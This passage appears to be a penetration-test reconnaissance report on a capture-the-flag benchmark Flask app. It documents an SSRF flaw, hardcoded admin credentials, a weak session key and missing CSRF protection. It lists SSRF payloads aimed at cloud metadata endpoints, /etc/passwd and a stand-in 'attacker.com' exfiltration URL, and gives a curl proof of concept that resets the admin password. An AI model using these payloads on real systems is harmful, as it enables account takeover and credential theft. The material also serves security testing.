**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/app.py:93-100`

**Vulnerable Code:**
```python
profile_picture_url = request.form.get('profile_picture_url')
if profile_picture_url:
    try:
        filename = secure_filename(profile_picture_url.split('/')[-1])
        urllib.request.urlretrieve(profile_picture_url, os.path.join(app.config['UPLOAD_FOLDER'], filename))
        user['profile_picture'] = filename
    except Exception as e:
        flash('Failed to fetch image from URL.')
```

**User Input:** `profile_picture_url` parameter from POST form at `/profile` endpoint

**Validation:** **NONE** - Accepts arbitrary URLs without any protocol, hostname, or port restrictions

**Exploitation Scenarios:**

1. **Localhost Access (Bypass IP Restrictions):**
   - URL: `http://127.0.0.1/reset_password?username=admin&newpassword=pwned`
   - Effect: Bypasses localhost IP check at `app.py:106`, resets admin password
   - Impact: Admin account takeover → FLAG access

2. **Cloud Metadata Access:**
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires header, partially mitigated)
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires header, partially mitigated)

3. **Internal Network Scanning:**
   - URLs: `http://192.168.1.1/`, `http://10.0.0.1/`, `http://172.16.0.1/`
   - Effect: Port scanning and service enumeration via timing and error messages

4. **File System Access:**
   - URL: `file:///etc/passwd`, `file:///app/app.py`
   - Effect: Read local files (if urllib supports file:// protocol)

5. **Data Exfiltration:**
   - URL: `http://attacker.com/?data=sensitive`
   - Effect: Establish callback channel, confirm SSRF vulnerability

**Proof of Concept:**
```bash
# Register and login as testuser
curl -X POST http://localhost:37053/register -d "username=attacker&password=pass123&first_name=Test&last_name=User&email=test@example.com"
curl -X POST http://localhost:37053/login -d "username=attacker&password=pass123" -c cookies.txt

# Exploit SSRF to reset admin password
curl -X POST http://localhost:37053/profile \
  -b cookies.txt \
  -d "first_name=Test&last_name=User&email=test@example.com&profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked"

# Login as admin with new password
curl -X POST http://localhost:37053/login -d "username=admin&password=hacked" -c admin-cookies.txt

# Retrieve FLAG
curl http://localhost:37053/profile -b admin-cookies.txt
```

### Hardcoded Credentials

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/app.py:11-20`

**Default Admin Account:**
- Username: `admin`
- Password: `adminpass`
- Email: `admin@example.com`

**Code:**
```python
users = {
    'admin': {
        'username': 'admin',
        'password': 'adminpass',  # Plaintext, hardcoded
        'first_name': 'Admin',
        'last_name': 'User',
        'email': 'admin@example.com',
        'profile_picture': None
    }
}
```

**Impact:** Immediate admin access if credentials unchanged, FLAG retrieval

### Weak Session Secret Key

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/app.py:7`

**Code:** `app.secret_key = 'supersecretkey'`

**Impact:** Enables session forgery - attackers can create arbitrary session cookies with any username (including `admin`) using Flask's session serialization with the known secret key

### Missing Security Headers

**Analysis:** No security headers configured in application code or infrastructure:
- **HSTS (Strict-Transport-Security):** Not configured
- **CSP (Content-Security-Policy):** Not configured
- **X-Frame-Options:** Not configured
- **X-Content-Type-Options:** Not configured
- **Referrer-Policy:** Not configured

**Recommendation:** Implement via Flask-Talisman or reverse proxy configuration

### No CSRF Protection

**Impact:** All state-changing endpoints vulnerable to Cross-Site Request Forgery:
- `/register` (POST) - Unauthorized account creation
- `/login` (POST) - Forced authentication
- `/logout` (GET) - Force logout (GET-based CSRF)
- `/profile` (POST) - Unauthorized profile modifications

**Recommendation:** Implement Flask-WTF with CSRF tokens

---

**END OF RECONNAISSANCE DELIVERABLE**